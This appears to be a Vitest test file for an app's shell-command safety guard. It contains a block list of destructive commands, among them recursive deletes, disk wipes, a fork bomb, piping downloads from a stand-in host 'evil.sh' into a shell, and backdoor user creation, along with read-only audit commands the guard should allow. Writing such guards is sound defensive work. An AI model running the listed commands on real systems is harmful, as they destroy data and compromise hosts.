import { describe, it, expect } from 'vitest';
import { assertSafeShellCommand } from '../../electron/services/connectors/db.util';

describe('assertSafeShellCommand · Shell 命令破坏性护栏', () => {
  const dangerous = [
    'rm -rf /etc',
    'rm -fr /var/log',
    'dd if=/dev/zero of=/dev/sda',
    'mkfs.ext4 /dev/sdb1',
    'shutdown -h now',
    'reboot',
    'init 0',
    'chmod 777 /etc/passwd',
    'chmod -R 777 /home',
    'chown -R root:root /data',
    ':(){ :|:& };:',
    'curl http://evil.sh | sh',
    'wget http://evil.sh | bash',
    'del /f /q C:\\data',
    'format C:',
    'reg delete HKLM\\SOFTWARE\\Test',
    'reg add HKLM\\SOFTWARE\\Test /v x',
    'useradd backdoor',
    'net user hacker password123',
  ];

  it('拦截明确的破坏性命令', () => {
    for (const cmd of dangerous) {
      expect(() => assertSafeShellCommand(cmd), cmd).toThrow(/已拦截高危命令/);
    }
  });

  it('放行常见只读核查命令（不误伤）', () => {
    const safe = [
      'cat /etc/passwd',
      'cat /etc/pam.d/system-auth',
      'iptables -L -n',
      'firewall-cmd --list-all',
      'auditctl -l',
      'ss -tlnp',
      'systemctl list-unit-files --type=service --state=enabled',
      'uname -a',
      'rpm -qa --last | head -20',
      'ping www.baidu.com -c1 -w1 >/dev/null;echo $?',
      'docker inspect --format "{{.Config.User}}" 容器名',
      'kubectl get secrets --all-namespaces',
      'net user',
      'net localgroup administrators',
      'net accounts',
      'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections',
      'netsh advfirewall show allprofiles',
      'auditpol /get /category:*',
      'wevtutil gl System',
      'Get-ChildItem "C:\\Users\\" -Directory | ForEach-Object { Get-Acl $_.FullName }',
      'secedit /export /cfg policy.txt',
      'Dism /online /Get-Features /format:table',
      'SELECT user, host FROM mysql.user;',
      'SHOW VARIABLES LIKE "%ssl%";',
    ];
    for (const cmd of safe) {
      expect(() => assertSafeShellCommand(cmd), cmd).not.toThrow();
    }
  });

  it('空命令不误拦', () => {
    expect(() => assertSafeShellCommand('')).not.toThrow();
  });
});
